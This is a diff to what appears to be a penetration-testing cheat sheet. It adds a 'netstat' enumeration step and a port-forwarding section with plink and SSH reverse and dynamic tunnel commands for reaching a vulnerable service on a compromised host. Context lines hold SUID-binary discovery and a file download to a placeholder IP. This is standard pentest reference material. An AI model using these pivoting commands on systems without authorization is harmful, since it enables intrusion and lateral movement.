@@ -636,6 +636,7 @@ whoami
 hostname
 systeminfo
 ipconfig /all
+netstat
 ```
 
 Network discovery:
@@ -720,6 +721,32 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 
 ```powershell
 Invoke-Webrequest -Uri <IP> -OutFile <DestFile>
+```
+
+## Port forwarding
+
+If you find a vulnerable service running on the target host, one way to exploit
+it would be to forward the port where this service is running towards your
+machine and launch the exploit from there.
+
+### Windows
+
+```cmd
+plink.exe -ssh -l <USER> -pw <PASSWORD> -R <BIND_IP>:<BIND_PORT>:127.0.0.1:<PORT> <BIND_IP>
+```
+
+
+### Linux
+
+#### SSH tunneling
+
+```sh
+# port forward
+ssh -N -R <BIND_IP>:<BIND_PORT>:host:hostport <user@address>
+
+# dynamic port forward + add 8888 port to the proxychains conf
+ssh -N -D 127.0.0.1:8888 <user@address>
+
 ```
 
 ## Cracking
